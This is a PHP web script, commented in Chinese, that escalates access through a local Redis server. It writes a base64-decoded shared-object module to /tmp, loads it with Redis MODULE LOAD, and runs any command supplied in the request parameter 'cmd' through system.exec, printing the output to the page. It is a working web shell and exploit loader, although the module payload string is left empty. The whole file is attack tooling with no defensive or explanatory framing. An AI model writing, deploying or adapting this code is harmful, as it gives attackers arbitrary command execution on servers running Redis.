<?php

$exp_so = '';
$out_file = '/tmp/EH5c42r1Ke4W.so';
$sys_cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : 'whoami';     // 接收要执行的命令
$passwd = '';   // 留空为没有密码

$tcp = new _TCP;
if (!$tcp->_TCP_L('127.0.0.1',6379)) {
    echo "[!] Redis 连接失败!<br>\r\n";
} else {
	echo "[*] Redis 连接成功!<br>\r\n";
	
	if(!empty($passwd)){
		echo "[?] 密码登录返回信息:".$tcp->_TCP_W("AUTH {$passwd}")."<br>\r\n";
	}

	
	
	if(file_exists($out_file)){
		if(strstr($tcp->_TCP_W("MODULE LIST"),'system') != false){
			echo "[*] 加载so文件 {$out_file} 成功!<br>\r\n";
			
			echo "[*] 命令『".htmlspecialchars($sys_cmd)."』返回 Ps:文件最大接收 1024 * 1024 字节 <hr>\r\n".htmlspecialchars($tcp->_TCP_W("system.exec \"{$sys_cmd}\""))."<hr><br>\r\n";

		}else{
			if(unlink($out_file)){
				echo "[*] 删除 so 文件:{$out_file} 成功! 请重新访问...<br>\r\n";
			}else{
				echo "[!] 删除 so 文件:{$out_file} 失败! 请修改文件名后重试...<br>\r\n";
			}
			
		}
	}else{
		if(strstr($tcp->_TCP_W("MODULE LIST"),'system') != false){
			echo "[*] 加载so文件 {$out_file} 成功!<br>\r\n";
			
			echo "[*] 命令『".htmlspecialchars($sys_cmd)."』返回 Ps:文件最大接收 1024 * 1024 字节 <hr>\r\n".htmlspecialchars($tcp->_TCP_W("system.exec \"{$sys_cmd}\""))."<hr><br>\r\n";
		}else{
			if(is_writable(dirname($out_file).'/')){
				echo "[*] 目录 ".dirname($out_file).'/'." 有写权限!<br>\r\n";
				if(file_put_contents($out_file,base64_decode($exp_so))){
					echo "[*] 文件 ".$out_file." 写出成功!<br>\r\n";
					$tcp->_TCP_W("MODULE LOAD {$out_file}");
					if(strstr($tcp->_TCP_W("MODULE LIST"),'system') != false){
						echo "[*] 加载so文件 {$out_file} 成功!<br>\r\n";
					
						echo "[*] 命令『".htmlspecialchars($sys_cmd)."』返回 Ps:文件最大接收 1024 * 1024 字节 <hr>\r\n".htmlspecialchars($tcp->_TCP_W("system.exec \"{$sys_cmd}\""))."<hr><br>\r\n";

					}else{
						echo "[!] 加载so文件 {$out_file} 失败!<br>\r\n";
					}

				}else{
					echo "[!] 文件 ".$out_file." 写出失败!<br>\r\n";
				}

			}else{
				echo "[!] 目录 ".dirname($out_file).'/'." 无写权限!<br>\r\n";
			}
		}
	}
$tcp->_TCP_C();
}


Class _TCP{
	private $socket;
	
	function _TCP_L($ip,$port){
		$this->socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
		return socket_connect($this->socket,$ip,$port);
	}
	
	function _TCP_W($data){
		$data .= "\r\n";
		socket_write($this->socket,$data,strlen($data));
		return socket_read($this->socket,1024 * 1024);
	}
	
	function _TCP_C(){
		socket_close($this->socket);
	}

}